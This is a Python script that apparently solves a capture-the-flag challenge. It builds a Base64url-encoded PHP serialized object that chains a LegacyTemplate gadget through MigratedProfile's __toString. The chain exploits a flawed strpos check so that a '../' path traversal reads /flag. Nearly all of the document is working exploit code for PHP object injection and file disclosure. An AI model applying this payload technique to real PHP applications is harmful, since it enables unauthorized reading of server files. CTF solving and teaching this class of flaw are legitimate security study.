#!/usr/bin/env python3
# Ultimative PHP - build the Base64url profile that leaks the flag.
#
# unserialize() is restricted to MigratedProfile and LegacyTemplate. We nest a
# LegacyTemplate inside MigratedProfile.displayName. When the page prints the
# profile it calls __toString, which walks into LegacyTemplate and reads
# templates/<template>. LegacyTemplate only rejects "../" when strpos finds it
# past position 0 (strpos returning 0 is falsy), so a value that starts with
# "../" slips through and traverses out of the templates directory to /flag.

import base64

template = "../../../../flag"

serialized = (
    'O:15:"MigratedProfile":1:{'
    's:11:"displayName";'
    'O:14:"LegacyTemplate":1:{'
    f's:8:"template";s:{len(template)}:"{template}";'
    '}'
    '}'
)

profile = base64.urlsafe_b64encode(serialized.encode()).rstrip(b"=").decode()

print("serialized:", serialized)
print("profile    :", profile)
